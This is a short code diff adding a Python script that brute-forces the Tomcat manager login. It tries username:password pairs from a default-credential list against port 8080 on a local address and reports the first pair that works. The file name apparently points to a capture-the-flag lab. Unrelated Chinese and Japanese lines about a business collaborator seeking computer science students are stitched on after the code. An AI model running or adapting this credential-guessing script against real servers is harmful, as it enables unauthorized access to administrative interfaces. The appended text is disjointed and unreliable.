jerry.py
@@ -0,0 +1,15 @@
#!/usr/bin/env python
# Jerry is built to brute force Tomcat ;)
import sys
import requests

# Variables
ip = "127.0.0.1"

with open('tomcat-betterdefaultpasslist.txt') as f:
    for line in f:
        c = line.strip('\n').split(":")
        r = requests.get(f'http://{ip}:8080/manager/html', auth=(c[0], c[1]))
        if r.status_code == 200:
            print("Valid Credentials Found! \"" + line.strip('\n') + "\"")
            sys.exit()

   .

  有趣的數據：需要電腦科學專業的學生作為想要創業的合作者



興味深いデータ: ビジネスを始めたい協力者には、コンピューター サイエンスの学生が必要です
